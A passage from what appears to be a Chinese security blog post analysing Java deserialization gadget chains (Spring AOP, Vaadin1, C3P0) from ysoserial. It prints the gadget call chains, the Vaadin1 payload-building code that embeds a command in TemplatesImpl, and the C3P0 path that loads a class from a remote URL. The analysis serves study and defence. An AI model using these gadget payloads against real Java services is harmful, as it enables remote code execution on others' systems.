class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JdkDynamicAopProxy</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    Object oldProxy = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">boolean</span> setProxyContext = <span class="keyword">false</span>;</span><br><span class="line">    TargetSource targetSource = <span class="keyword">this</span>.advised.targetSource;  <span class="comment">// </span></span><br><span class="line">    Class&lt;?&gt; targetClass = <span class="keyword">null</span>;</span><br><span class="line">    Object target = <span class="keyword">null</span>;</span><br><span class="line">    Object var13;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.equalsDefined &amp;&amp; AopUtils.isEqualsMethod(method)) &#123;</span><br><span class="line">            Boolean var18 = <span class="keyword">this</span>.equals(args[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span> var18;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.hashCodeDefined &amp;&amp; AopUtils.isHashCodeMethod(method)) &#123;</span><br><span class="line">            Integer var17 = <span class="keyword">this</span>.hashCode();</span><br><span class="line">            <span class="keyword">return</span> var17;</span><br><span class="line">        &#125;</span><br><span class="line">        Object retVal;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.advised.opaque &amp;&amp; method.getDeclaringClass().isInterface() &amp;&amp; method.getDeclaringClass().isAssignableFrom(Advised.class)) &#123;</span><br><span class="line">            retVal = AopUtils.invokeJoinpointUsingReflection(<span class="keyword">this</span>.advised, method, args);</span><br><span class="line">            <span class="keyword">return</span> retVal;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.advised.exposeProxy) &#123;</span><br><span class="line">            oldProxy = AopContext.setCurrentProxy(proxy);</span><br><span class="line">            setProxyContext = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        target = targetSource.getTarget();  <span class="comment">// </span></span><br><span class="line">        <span class="keyword">if</span> (target != <span class="keyword">null</span>) &#123;</span><br><span class="line">            targetClass = target.getClass();</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Object&gt; chain = <span class="keyword">this</span>.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);</span><br><span class="line">        <span class="keyword">if</span> (chain.isEmpty()) &#123;</span><br><span class="line">            retVal = AopUtils.invokeJoinpointUsingReflection(target, method, args); <span class="comment">// 反射调用对象的 method 方法</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            MethodInvocation invocation = <span class="keyword">new</span> ReflectiveMethodInvocation(proxy, target, method, args, targetClass, chain);</span><br><span class="line">            retVal = invocation.proceed();</span><br><span class="line">        &#125;</span><br><span class="line">        Class&lt;?&gt; returnType = method.getReturnType();</span><br><span class="line">        <span class="keyword">if</span> (retVal != <span class="keyword">null</span> &amp;&amp; retVal == target &amp;&amp; returnType.isInstance(proxy) &amp;&amp; !RawTargetAccess.class.isAssignableFrom(method.getDeclaringClass()))</span><br><span class="line">            retVal = proxy;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (retVal == <span class="keyword">null</span> &amp;&amp; returnType != Void.TYPE &amp;&amp; returnType.isPrimitive()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AopInvocationException(<span class="string">&quot;Null return value from advice does not match primitive return type for: &quot;</span> + method);</span><br><span class="line">        &#125;</span><br><span class="line">        var13 = retVal; <span class="comment">// 返回方法</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (target != <span class="keyword">null</span> &amp;&amp; !targetSource.isStatic()) &#123;</span><br><span class="line">            targetSource.releaseTarget(target);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (setProxyContext) &#123;</span><br><span class="line">            AopContext.setCurrentProxy(oldProxy);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> var13;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AopUtils</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">invokeJoinpointUsingReflection</span><span class="params">(Object target, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ReflectionUtils.makeAccessible(method);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(target, args); <span class="comment">// 反射调用</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException var4) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var4.getTargetException();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AopInvocationException(<span class="string">&quot;AOP configuration seems to be invalid: tried calling method [&quot;</span> + method + <span class="string">&quot;] on target [&quot;</span> + target + <span class="string">&quot;]&quot;</span>, var5);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AopInvocationException(<span class="string">&quot;Could not access method [&quot;</span> + method + <span class="string">&quot;]&quot;</span>, var6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Vaddin1"><a href="#Vaddin1" class="headerlink" title="Vaddin1"></a>Vaddin1</h2><blockquote><p>Vaadin 是 Java Web 应用开发框架，用 Java 或 TypeScript 构建可伸缩的 UI，并使用集成的工具、组件和设计系统来更快地迭代、更好地设计和简化开发过程。<br>CC2 + CC5<br>使用 TemplatesImpl 承载恶意代码<br>通过动态代理 BadAttributeValueExpException 的反序列化触发</p></blockquote><p>利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GadgetChain:</span><br><span class="line">    BadAttributeValueExpException.readObject()</span><br><span class="line">        PropertysetItem.toString()</span><br><span class="line">                PropertysetItem.getPropertyId()</span><br><span class="line">                    NestedMethodProperty.getValue()</span><br><span class="line">                        TemplatesImpl.getObjectPropertyValue()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/MJvkQ7gFzd3eA4x.png" ><p>ysoserial.payloads.Vaadin1#getObject 返回动态代理 BadAttributeValueExpException。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span> <span class="params">(String command)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 构造 TemplatesImpl 承载恶意指令</span></span><br><span class="line">    Object templ = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 存储 Property 属性值</span></span><br><span class="line">    PropertysetItem pItem = <span class="keyword">new</span> PropertysetItem();        </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造 NestedMethodProperty 承载 TemplatesImpl</span></span><br><span class="line">    NestedMethodProperty&lt;Object&gt; nmprop = <span class="keyword">new</span> NestedMethodProperty&lt;Object&gt;(templ, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">    pItem.addItemProperty (<span class="string">&quot;outputProperties&quot;</span>, nmprop);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 利用 BadAttributeValueExpException 的 val 字段承载 PropertysetItem</span></span><br><span class="line">    BadAttributeValueExpException b = <span class="keyword">new</span> BadAttributeValueExpException(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    Reflections.setFieldValue (b, <span class="string">&quot;val&quot;</span>, pItem);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BadAttributeValueExpException.readObject 在反序列化时会调用对象的 toString 方法，这里即 PropertysetItem.toString，进一步触发 NestedMethodProperty.getValue</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BadAttributeValueExpException</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">    Object valObj = gf.get(<span class="string">&quot;val&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">        val = <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();    <span class="comment">// 调用对象的 toString 方法</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PropertysetItem</span></span><br><span class="line"><span class="keyword">private</span> LinkedList&lt;Object&gt; list = <span class="keyword">new</span> LinkedList(); <span class="comment">// 存储id</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Property <span class="title">getItemProperty</span><span class="params">(Object id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (Property)<span class="keyword">this</span>.map.get(id);  <span class="comment">// 获取属性</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String retValue = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    Iterator i = <span class="keyword">this</span>.getItemPropertyIds().iterator();</span><br><span class="line">    <span class="keyword">while</span>(i.hasNext()) &#123;    <span class="comment">// 遍历 id</span></span><br><span class="line">        Object propertyId = i.next();</span><br><span class="line">        retValue = retValue + <span class="keyword">this</span>.getItemProperty(propertyId).getValue <span class="comment">// 获取映射的 Property 属性对象，并调用其 getValue 方法</span></span><br><span class="line">        <span class="keyword">if</span> (i.hasNext()) &#123;</span><br><span class="line">            retValue = retValue + <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retValue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">addItemProperty</span><span class="params">(Object id, Property property)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (id == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException(<span class="string">&quot;Item property id can not be null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.map.containsKey(id)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.map.put(id, property); <span class="comment">// 添加属性</span></span><br><span class="line">        <span class="keyword">this</span>.list.add(id);</span><br><span class="line">        <span class="keyword">this</span>.fireItemPropertySetChange();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NestedMethodProperty</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">NestedMethodProperty</span><span class="params">(Object instance, String propertyName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.instance = instance;   <span class="comment">// 对象实例</span></span><br><span class="line">    <span class="keyword">this</span>.initialize(instance.getClass(), propertyName); <span class="comment">// 属性值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> T <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object object = <span class="keyword">this</span>.instance;</span><br><span class="line">        Iterator var2 = <span class="keyword">this</span>.getMethods.iterator();</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!var2.hasNext()) &#123;</span><br><span class="line">                <span class="keyword">return</span> object;</span><br><span class="line">            &#125;</span><br><span class="line">            Method m = (Method)var2.next();</span><br><span class="line">            object = m.invoke(object);  <span class="comment">// 反射调用封装对象指定属性的 getter 方法</span></span><br><span class="line">        &#125; <span class="keyword">while</span>(object != <span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable var4) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MethodException(<span class="keyword">this</span>, var4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h2><blockquote><p>C3P0 是一个开源的 JDBC 连接池，它实现了数据源和 JNDI 绑定，支持 JDBC3 规范和 JDBC2 的标准扩展。目前使用它的开源项目有 Hibernate、Spring 等。</p></blockquote><p>适用版本</p><ul><li>c3p0:0.9.5.2</li></ul><p>利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GadgetChain:</span><br><span class="line">    PoolBackedDataSourceBase.readObject()</span><br><span class="line">        ReferenceIndirector.getObject()</span><br><span class="line">            ReferenceableUtils.referenceToObject()</span><br><span class="line">                Class.forName0()</span><br><span class="line">                    URLClassLoader.loadClass()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/mcCvQJ2HSIz7jFt.png" ><p>PoolBackedDataSourceBase 类中储存了 PropertyChangeSupport 和 VetoableChangeSupport 对象，用于支持监听器的功能。</p><p>这个类在序列化和反序列化时，要保存内部的 ConnectionPoolDataSource 成员变量，如果 connectionPoolDataSource 本身是不可序列化的对象，则使用 ReferenceIndirector 对其进行引用的封装，返回一个可以被序列化的 IndirectlySerialized 实例对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoolBackedDataSourceBase</span> <span class="keyword">extends</span> <span class="title">IdentityTokenResolvable</span> <span class="keyword">implements</span> <span class="title">Referenceable</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> PropertyChangeSupport pcs = <span class="keyword">new</span> PropertyChangeSupport(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">protected</span> VetoableChangeSupport vcs = <span class="keyword">new</span> VetoableChangeSupport(<span class="keyword">this</span>);</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream oos)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        oos.writeShort(<span class="number">1</span>);</span><br><span class="line">        ReferenceIndirector indirector;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SerializableUtils.toByteArray(<span class="keyword">this</span>.connectionPoolDataSource);</span><br><span class="line">            oos.writeObject(<span class="keyword">this</span>.connectionPoolDataSource); <span class="comment">// 保存成员变量</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotSerializableException var9) &#123;   <span class="comment">// 如果该成员变量不可序列化</span></span><br><span class="line">            MLog.getLogger(<span class="keyword">this</span>.getClass()).log(MLevel.FINE, <span class="string">&quot;Direct serialization provoked a NotSerializableException! Trying indirect.&quot;</span>, var9);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                indirector = <span class="keyword">new</span> ReferenceIndirector(); <span class="comment">// 使用 ReferenceIndirector 封装</span></span><br><span class="line">                oos.writeObject(indirector.indirectForm(<span class="keyword">this</span>.connectionPoolDataSource));    <span class="comment">// 返回 IndirectlySerialized</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> var7;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">&quot;Problem indirectly serializing connectionPoolDataSource: &quot;</span> + var8.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>indirectForm 方法中调用会调用 ConnectionPoolDataSource 的 getReference 方法返回一个 Reference 对象，并使用 ReferenceSerialized 对象对其封装。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> IndirectlySerialized <span class="title">indirectForm</span><span class="params">(Object var1)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Reference var2 = ((Referenceable)var1).getReference();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ReferenceIndirector.ReferenceSerialized(var2, <span class="keyword">this</span>.name, <span class="keyword">this</span>.contextName, <span class="keyword">this</span>.environmentProperties);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PoolBackedDataSourceBase 类在反序列化时，调用 IndirectlySerialized#getObject 方法重新生成 ConnectionPoolDataSource 对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="keyword">short</span> version = ois.readShort();</span><br><span class="line">    <span class="keyword">switch</span>(version) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        Object o = ois.readObject();</span><br><span class="line">        <span class="keyword">if</span> (o <span class="keyword">instanceof</span> IndirectlySerialized) &#123;</span><br><span class="line">            o = ((IndirectlySerialized)o).getObject();  <span class="comment">// 这里</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.connectionPoolDataSource = (ConnectionPoolDataSource)o;</span><br><span class="line">        <span class="keyword">this</span>.dataSourceName = (String)ois.readObject();</span><br><span class="line">        o = ois.readObject();</span><br><span class="line">        <span class="keyword">if</span> (o <span class="keyword">instanceof</span> IndirectlySerialized) &#123;</span><br><span class="line">            o = ((IndirectlySerialized)o).getObject();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.extensions = (Map)o;</span><br><span class="line">        <span class="keyword">this</span>.factoryClassLocation = (String)ois.readObject();</span><br><span class="line">        <span class="keyword">this</span>.identityToken = (String)ois.readObject();</span><br><span class="line">        <span class="keyword">this</span>.numHelperThreads = ois.readInt();</span><br><span class="line">        <span class="keyword">this</span>.pcs = <span class="keyword">new</span> PropertyChangeSupport(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>.vcs = <span class="keyword">new</span> VetoableChangeSupport(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">&quot;Unsupported Serialized Version: &quot;</span> + version);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ReferenceSerialized#getObject 调用 InitialContext#lookup 方法尝试使用 JNDI 来获取相应的对象，在 contextName、env 均为空的情况下，则调用 ReferenceableUtils.referenceToObject() 使用 Reference 中的信息来获取。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        InitialContext var1;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.env == <span class="keyword">null</span>) &#123;</span><br><span class="line">            var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            var1 = <span class="keyword">new</span> InitialContext(<span class="keyword">this</span>.env);</span><br><span class="line">        &#125;</span><br><span class="line">        Context var2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.contextName != <span class="keyword">null</span>) &#123;</span><br><span class="line">            var2 = (Context)var1.lookup(<span class="keyword">this</span>.contextName);  <span class="comment">// JNDI 获取对象</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Reference 获取对象</span></span><br><span class="line">        <span class="keyword">return</span> ReferenceableUtils.referenceToObject(<span class="keyword">this</span>.reference, <span class="keyword">this</span>.name, var2, <span class="keyword">this</span>.env);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ReferenceIndirector.logger.isLoggable(MLevel.WARNING)) &#123;</span><br><span class="line">            ReferenceIndirector.logger.log(MLevel.WARNING, <span class="string">&quot;Failed to acquire the Context necessary to lookup an Object.&quot;</span>, var3);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Failed to acquire the Context necessary to lookup an Object: &quot;</span> + var3.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ReferenceableUtils#referenceToObject 中使用 URLClassLoader 从 URL 中加载了类并实例化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">referenceToObject</span><span class="params">(Reference var0, Name var1, Context var2, Hashtable var3)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String var4 = var0.getFactoryClassName();</span><br><span class="line">        String var11 = var0.getFactoryClassLocation();</span><br><span class="line">        ClassLoader var6 = Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">if</span> (var6 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            var6 = ReferenceableUtils.class.getClassLoader();</span><br><span class="line">        &#125;</span><br><span class="line">        Object var7;</span><br><span class="line">        <span class="keyword">if</span> (var11 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            var7 = var6;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 使用 URLClassLoader 从 URL 中加载了类并实例化</span></span><br><span class="line">            URL var8 = <span class="keyword">new</span> URL(var11);</span><br><span class="line">            var7 = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;var8&#125;, var6);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        Class var12 = Class.forName(var4, <span class="keyword">true</span>, (ClassLoader)var7);</span><br><span class="line">        ObjectFactory var9 = (ObjectFactory)var12.newInstance();</span><br><span class="line">        <span class="keyword">return</span> var9.getObjectInstance(var0, var1, var2, var3);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isLoggable(MLevel.FINE)) &#123;</span><br><span class="line">            logger.log(MLevel.FINE, <span class="string">&quot;Could not resolve Reference to Object!&quot;</span>, var10);</span><br><span class="line">        &#125;</span><br><span class="line">        